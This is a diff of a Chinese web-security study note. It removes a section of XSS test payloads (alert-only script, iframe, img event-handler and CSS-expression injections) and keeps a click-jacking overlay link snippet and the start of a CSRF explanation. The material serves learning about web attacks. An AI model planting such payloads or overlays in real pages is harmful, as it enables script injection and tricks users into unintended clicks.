@@ -6,46 +6,14 @@ description:
 ---
 # Preface
 
-# xss
-属性值请escape
-
-	\<script\>alert(\"感觉不错的样子！\")\</script\>
-	<script>alert(/xss/)</script>
-
-## 危害
-
-
-## todo
-Refer: http://www.cnblogs.com/TankXiao/archive/2012/03/21/2337194.html
-
-## iframe
-
-	<iframe/onload=alert(10)>
-
-## onerror onchange onload
-
-	t = '<img src=1 onerror=alert(2)>'
-	t = '<img src=1 onload=alert(2)>'
-	t = '<img src=1 onchange=alert(2)>'
-
-## style(for ie6)
-expression
-
-	<div style="width: expression(alert('xss'));">
-
-Or javascript
-
-	<div style="background-image: url(javascript:alert('xss'))">
-
-And this??
-
-	<div style="this-is-js-property: alert 'xss';">
 
 # click-jacking vulnerability
 
 ## opacity
 
 	<a href="http://example.com/attack.html" style="display: block; z-index: 100000; opacity: 0.1; position: fixed; top: 0px; left: 0; width: 1000000px; height: 100000px; background-color: red;"> </a>
+
+# XSS
 
 # CSRF
 Cross-site request forgery跨站请求伪造，也被称为“one click attack”或者session riding，
